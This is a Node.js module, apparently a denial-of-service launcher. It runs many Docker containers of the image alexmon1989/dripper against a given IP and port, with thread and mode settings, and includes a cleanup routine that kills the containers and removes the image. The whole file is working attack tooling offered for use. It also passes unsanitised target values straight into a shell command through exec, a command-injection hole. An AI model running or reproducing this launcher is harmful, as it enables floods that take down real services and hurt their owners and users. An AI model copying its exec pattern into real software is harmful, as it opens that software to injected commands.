const { exec } = require('child_process');

class Exterminatus {
  attack({ ip, port, mode, threads, containers }) {
    if (!containers) {
      console.error('Incorrect number of containers');
      return;
    }
    for (let i = containers; i !== 0; i--) {
      const cmd = `docker run --rm --name="container${i}" alexmon1989/dripper:latest -s ${ip} -p ${port} -t ${threads} -m ${mode} &`
      console.info(cmd);
      setTimeout(() => {
        exec(cmd, {
          maxBuffer: 1024 * 1024 / containers
        }, (error, stdout, stderr) => {
          if (error) {
            console.error(error);
            return;
          }

          if (stderr) {
            console.error(stderr);
            return;
          }

          console.info(stdout);
        });
      });
    }
  }

  killContainers(times) {
    const containers = new Array(times).fill('container').map((v, i) => `${v}${i + 1}`).join(' ');
    const cmd = `docker container kill ${containers} && docker image rm -f alexmon1989/dripper`;
    console.info(cmd);
    setTimeout(() => {
      exec(cmd, (error, stdout, stderr) => {
        if (error) {
          console.error(error);
          return;
        }

        if (stderr) {
          console.error(stderr);
          return;
        }

        console.info(stdout);
      });
    });
  }
}

module.exports.default = new Exterminatus();